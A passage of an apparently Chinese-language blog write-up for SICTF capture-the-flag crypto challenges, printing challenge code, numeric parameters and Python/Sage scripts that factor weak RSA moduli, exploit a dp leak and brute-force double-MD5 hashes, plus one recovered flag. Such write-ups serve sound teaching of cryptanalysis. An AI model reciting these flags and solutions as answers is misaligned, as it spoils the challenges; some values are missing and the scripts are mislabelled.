class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>k = getRandomNBitInteger(<span class="hljs-number">64</span>)<br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br><span class="hljs-keyword">if</span> isPrime(p) <span class="hljs-keyword">and</span> isPrime(q):<br><span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, n, e</span>):<br>m = bytes_to_long(msg)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(m, e, n)<br><br>n = p * q<br>e = <span class="hljs-number">65537</span><br>c = encrypt(flag, n, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment">#n = 2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br><span class="hljs-comment">#c = 1162375069210804266034094584942794481470301602122091344590668656120128936761168164673823514232328715217241524062023457713973727518007443604233760475552174214966591823835585191443465256735930086309706593996639864</span><br></code></pre></td></tr></table></figure><p>n=p*q，代进去相当于只有k一个未知量，解方程即可<br>sage的solve函数可以求解方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br>k = var(<span class="hljs-string">&#x27;k&#x27;</span>)<br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br>a=n==p*q <br>k = solve(a, k)<br><span class="hljs-built_in">print</span>(k)<br><span class="hljs-comment">#k == 10453474106135055672</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/sictf/36.png"><br>解出k带进去原来脚本就可以求p，q了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br>c = <span class="hljs-number">1162375069210804266034094584942794481470301602122091344590668656120128936761168164673823514232328715217241524062023457713973727518007443604233760475552174214966591823835585191443465256735930086309706593996639864</span><br>e = <span class="hljs-number">65537</span><br>k = <span class="hljs-number">10453474106135055672</span><br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure><h4 id="hashgame"><a href="#hashgame" class="headerlink" title="hashgame"></a>hashgame</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(md5(<span class="hljs-built_in">str</span>(md5(i.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest())<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">999a215b1f8372bb0f1c84c467a1506b</span><br><span class="hljs-string">02b0b94ee1fa195ae7959560893f7e3c</span><br><span class="hljs-string">297e7ca127d2eef674c119331fe30dff</span><br><span class="hljs-string">65c162f7c43612ba1bdf4d0f2912bbc0</span><br><span class="hljs-string">ed8a4ab0c0967b14e3bf6b145e153ec9</span><br><span class="hljs-string">d24412e1ab190533176a653cef11b185</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">cd7fd1517e323f26c6f1b0b6b96e3b3d</span><br><span class="hljs-string">a94837b18f8f43f29448b40a6e7386ba</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">d7afde3e7059cd0a0fe09eec4b0008cd</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">4c0d13d3ad6cc317017872e51d01b238</span><br><span class="hljs-string">83be264eb452fcf0a1c322f2c7cbf987</span><br><span class="hljs-string">4e44f1ac85cd60e3caa56bfd4afb675e</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">4e44f1ac85cd60e3caa56bfd4afb675e</span><br><span class="hljs-string">ed108f6919ebadc8e809f8b86ef40b05</span><br><span class="hljs-string">a94837b18f8f43f29448b40a6e7386ba</span><br><span class="hljs-string">dcfcd07e645d245babe887e5e2daa016</span><br><span class="hljs-string">665f644e43731ff9db3d341da5c827e1</span><br><span class="hljs-string">83be264eb452fcf0a1c322f2c7cbf987</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">4c0d13d3ad6cc317017872e51d01b238</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">5eccf232f5ebb3e780543372692fff18</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>对flag先MD5加密为32位一个字符串，然后再对这个字符串的每一个字符MD5，改一下脚本爆破一下就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>a=<span class="hljs-string">&#x27;&#x27;</span><br>enc=[<span class="hljs-string">&#x27;999a215b1f8372bb0f1c84c467a1506b&#x27;</span>, <span class="hljs-string">&#x27;02b0b94ee1fa195ae7959560893f7e3c&#x27;</span>, <span class="hljs-string">&#x27;297e7ca127d2eef674c119331fe30dff&#x27;</span>, <span class="hljs-string">&#x27;65c162f7c43612ba1bdf4d0f2912bbc0&#x27;</span>, <span class="hljs-string">&#x27;ed8a4ab0c0967b14e3bf6b145e153ec9&#x27;</span>, <span class="hljs-string">&#x27;d24412e1ab190533176a653cef11b185&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;cd7fd1517e323f26c6f1b0b6b96e3b3d&#x27;</span>, <span class="hljs-string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;d7afde3e7059cd0a0fe09eec4b0008cd&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;4c0d13d3ad6cc317017872e51d01b238&#x27;</span>, <span class="hljs-string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>, <span class="hljs-string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>, <span class="hljs-string">&#x27;ed108f6919ebadc8e809f8b86ef40b05&#x27;</span>, <span class="hljs-string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>, <span class="hljs-string">&#x27;dcfcd07e645d245babe887e5e2daa016&#x27;</span>, <span class="hljs-string">&#x27;665f644e43731ff9db3d341da5c827e1&#x27;</span>, <span class="hljs-string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;4c0d13d3ad6cc317017872e51d01b238&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;5eccf232f5ebb3e780543372692fff18&#x27;</span>]<br><br>dic = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_&#125;&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">43</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>      des=md5(<span class="hljs-built_in">str</span>(md5(k.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()<br>      <span class="hljs-keyword">if</span> des==enc[i]:<br>         a=a+k<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-comment">#SICTF&#123;837eb83b-14ad-413b-9f58-15ce02fdd9b4&#125;</span><br></code></pre></td></tr></table></figure><h4 id="RRRSSSAAA"><a href="#RRRSSSAAA" class="headerlink" title="RRRSSSAAA"></a>RRRSSSAAA</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br>import gmpy2<br>import libnum<br><span class="hljs-keyword">from</span> secret import flag,hint,alpha<br><br>def <span class="hljs-title function_ invoke__">gen_num</span>(x):<br>    <span class="hljs-keyword">while</span> True:<br>        x+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">isPrime</span>(x):<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> x<br><br>p = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>q = <span class="hljs-title function_ invoke__">gen_num</span>(p*alpha)<br>r = <span class="hljs-title function_ invoke__">gen_num</span>(q*alpha*<span class="hljs-number">2</span>)<br>s = <span class="hljs-title function_ invoke__">gen_num</span>(r*alpha*<span class="hljs-number">4</span>)<br>n = p**alpha * q**(alpha*<span class="hljs-number">2</span>) * r**(alpha*<span class="hljs-number">4</span>) * s**<span class="hljs-number">2</span><br>e = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">2048</span>)<br>c = <span class="hljs-title function_ invoke__">pow</span>(libnum.<span class="hljs-title function_ invoke__">s2n</span>(flag), e, n)<br><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>, c)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;e =&#x27;</span>, e)<br>n = <span class="hljs-number">510598540378970007468346322989879190780475356832709189528874695730531468123747091318830966440138615736420891392158097533731041150162690662471483619765171875053776526546923686545162088172326434280369545887080098691661618888498451216122577703462656147845476260802989936275927468143618457014875124540773380472942489037761179303561650189545290190421786318533073909424735517884608967725919128200358535113829753453601297612782921831305721998858231417374167746154206561475003022801732102170674160043866579234096945753255309604584663823273990392197858273029361669185072049422597132579136784027822968387907216366150999438414498332890674564920800382005582891491049365978733797356415518435343495821039314228388769356638637099572998812062355774848959446125701462950655806332002764535951282449862140062574418031213788534096501985200284615865248974807525604893147298611402252296159828500266098282909607218395957805357667923653409828275804406466185333491486073920384298557332939701611488655278812282652143513835104674009767479927241052662403578967182673338296967573503287747778401579267126898937724971226916836862238412923209155792382534204896050548824028658237640251964366961727999178646613907934616655737902329568420682808750546571786374023614255135110482419627491157502417864563832543812083026753673687664854910877686333766643694031564516722983669199704788291656757271915091399977189663329054202997146978631991467923388119989473941572476162990901960011968892272676827771256008656450296183884491251752111424531449198118292179798490440493223653950102915889401116251591885909790869073018774674246846164536910633015902964911907187085243240032540938841961345835517368130042501382327926289017383981908729734129193302049155793436988510517701765733605569135643208447952662352778482137713239592896997102366230279153456455232519301534222340901671138239539845240151878610363390683459663471954623868659324304077587611084188341121303918876492043578883059738615210439439368338460631574255417822627815523601923537626576677004085017875860928802762176477815284840936951142176532768517728636562256240668409525184886142801802825451465440993457022771077957094228957592122319682216294509338262739872163482972508991702525289361105971574659126127296233247905505496525683817711366704746617027744889413904684867577081667137187623825349410229389484199608739864221035985277681307389939848405790294473878622092200837753161101695539947514614727699952200114544362051873938505591469240465379091377837297561323297393518152524513948294475770774872596601345526469590486037386767964812631618224527233850818909346007449756779707319609915127618828551910681421647307180399632857248867655836894968134457622987954781685664833951774981383914013420724637676787907498490619865488706542422141338754933476190313653530739822029700217857534243473680585150263523947891501341441371965435851479670882202992955935279933652356336270251591324623898094984119190752775236005057405257945038031382867511822173122001309505728526596893926445291712035117553637589190292816001770554129840326832888707541999454791653742647879694585329112697382151447923691770809327807665376014114552626285289291808032845544905356380497227622738746307685611140483875177839511922977657045680353723672792411661489242162646272105649970359134277499907207906149573299990033858943215801954126448693460102775418225293255402758159431943811872373682053160944887775375465971432320964554947377318554518275854303099420999992690990916801757184853847474379621177976926681977371922191722085164910430032177320954341986984523594583172470609743970245810969858512632597943721628165724329447516823159387734220282510185959768239630017162115072758419177056571781075148374822721899683720488356041096248563880547752710289151512607087038310649235610688255059182467964379544134070766646863815775576049106337955345150055151813028534690066771104188418296440067303355417210829440978858599306487361626723932883675404705319649877631289465547597225908934420304867048341698308940436377375588905463549199568800788130324653074398891097223958392703515180958466771395566567923630440881986781120062769327993137151783189811570714391264155060840731029466593405853721833971303821804104382800673631786729744779165371433211267361024896576031556979771007693215198547296582235167582106419779580693225211695215406540025468141235241168387527901851774993867055740692835931115312659500713701652905802357951993290979099170159167009106534001226859533836082801229997337966972579186548771169099646656172882424089451273021293821026173210665095782802709874946641962115525841325300318524665386511421662860490620819561338110623774842340380068922415609137358448899126553279894950604871889208579886778999174405582160576479554324208876082033912031737086248121899303730781498156597249803927142235444644481388064486155431912003641095674949903404176810866307571531389637794147871012904134653569388493652441432759092336752228939764110397029831387803943394811558386122839568158928461007578259968765727092577006588264867960486472014493774664081407186721351852883527145790575242285664659303948842228766554243966691396492391152581830022133814454196259968655735361775914705332258892954614272244452518449260489348504449204461418971768011384340273291232094176572232837038670467853897665877851434992557429017504229337778470080893449423405491607587635438331476572996201482633587271479001915768182336813417460145272910780420062773057289352127058606048428315185624554551172152106354445240590380140756355226376829443068190672329776832112173322011137862590548721676059398379694994522794474774534579546109677615257696703950497332824299576069196330271666459758430542051969093680846765661685489556479825015505460585577388300005030240514448617715276600874290664416888184557142542207029827016362686924883704397874129412267949416733492080843315519912943048041880665442664534980370689081266908497051077237188221752059058912835617635691061804481035908317765279937217591432632832678806430381325340000898958680468694182993189208039459712391492410123386884340504648296815916980264240229859574883155040793388439699245314010536014311134726579595932201351264754211113984594974123575279085420654342347792446273359397655783349850267895960713020361459104930811498666622216299579774939159380045958811891996366190154624989040001455252320159516822116133341010157165599727635333348456688307169980804760876207246783116588952529877373514768545007418968307885769960168050996962066803264260375707466369627458024513973771207018864983698407016663019106354023164759250846073414341438963394719456500998324900154652118420207057668806120330181700845296117532235012372135050553397046174401449323031309344766628888675704109715329046692002106076405553528413866402862565543443907259825033515101841485790388106868972724754988229771779715569516295419556055234476868558577442887306482605945053829666543946452255290321024138948999088611233226734197091325915223296133751626031378197131875533631358612215053149934608672729194446883476706267066475008836864936670808320239466055935088929279252129128009704233352664523535820092988950793050907265677092793104426094212209504897403359406325045852228354350509453013015487815230129380079713113632363881496974185547766115624580099624722897692297760495094913178120692467666707678647081180656345151015995338390986674404981831649353833607305738823436744297628382797810952028446046016233612873716789383675779820186248250486000672269630344269347652027789034023080859790238772676504723029078903218723114249502157501775936110552413022658586833869562215506206204712447588632398550497708640229614956652263449460598992811393334042395804931240940416629178335447861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001</span><br>c = <span class="hljs-number"></span><br>e = <span class="hljs-number">19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763</span><br><br><span class="hljs-comment">#************************************hint**************************************</span><br>M = libnum.<span class="hljs-title function_ invoke__">s2n</span>(hint)<br>P = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>Q = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>N = P * Q<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;N=&quot;</span> , N)<br>E = <span class="hljs-number">65537</span><br>dp = (gmpy2.<span class="hljs-title function_ invoke__">invert</span>(E,(P-<span class="hljs-number">1</span>)*(Q-<span class="hljs-number">1</span>)))%(P-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;dp=&quot;</span> , dp)<br>ct = <span class="hljs-title function_ invoke__">pow</span>(M, E, N)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;ct=&quot;</span> , ct)<br><span class="hljs-comment">#N= 154243858720978602820118866455277758287334223654318945323956633685668127012462551649034724900534326698546179107853501584676890290935304784613676008667655919749627682648852472398117930471389759979432279103098572267738634433626627146280660185675121614094399255782089060202532182667463993275434746386786808729553</span><br><span class="hljs-comment">#dp= 414447829724187823397808703878958757693775250832414113550357728233230359464880433113636330432984183165483109337095394192757735932571515450285102727598243</span><br><span class="hljs-comment">#ct= 107353143319003715532284973064969905174389167949274067058206046773012002421251301189097709121034091973243342582216724329271495555062882075119176838856174054763892910473175610614629226628025470613930226188506099489500606701109022668507012376482339056160636468427364776216626364765166621843217027512464383836160</span><br></code></pre></td></tr></table></figure><p>hint是dp泄露，先跑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">import libnum<br><br>n= <span class="hljs-number">154243858720978602820118866455277758287334223654318945323956633685668127012462551649034724900534326698546179107853501584676890290935304784613676008667655919749627682648852472398117930471389759979432279103098572267738634433626627146280660185675121614094399255782089060202532182667463993275434746386786808729553</span><br>e= <span class="hljs-number">65537</span><br>c= <span class="hljs-number">107353143319003715532284973064969905174389167949274067058206046773012002421251301189097709121034091973243342582216724329271495555062882075119176838856174054763892910473175610614629226628025470613930226188506099489500606701109022668507012376482339056160636468427364776216626364765166621843217027512464383836160</span><br>dp= <span class="hljs-number">414447829724187823397808703878958757693775250832414113550357728233230359464880433113636330432984183165483109337095394192757735932571515450285102727598243</span><br><br>p=gmpy2.<span class="hljs-title function_ invoke__">gcd</span>(<span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">2</span>,e*dp,n)-<span class="hljs-number">2</span>,n)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">1</span>, e):<br>    p = (dp * e - <span class="hljs-number">1</span>) <span class="hljs-comment">// i + 1</span><br>    <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>        q = n <span class="hljs-comment">// p</span><br>        <span class="hljs-keyword">break</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = gmpy2.<span class="hljs-title function_ invoke__">invert</span>(e, phi_n)<br>m = <span class="hljs-title function_ invoke__">pow</span>(c, d, n)<br>flag = libnum.<span class="hljs-title function_ invoke__">n2s</span>(<span class="hljs-keyword">int</span>(m))<br><span class="hljs-keyword">print</span>(flag)<br><span class="hljs-comment">#Alpha == 8</span><br></code></pre></td></tr></table></figure><blockquote><p>代入计算， n约等于 (8<strong>16)*(128</strong>32)*(4096**2)*p**58，只有一个未知数p，解方程可以得到一个在p附近的数，在这个数的前后爆破一下即可得到p。p的长度为512bit大于flag的长度，所以RSA模p</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">import gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> sympy import *<br>n = <span 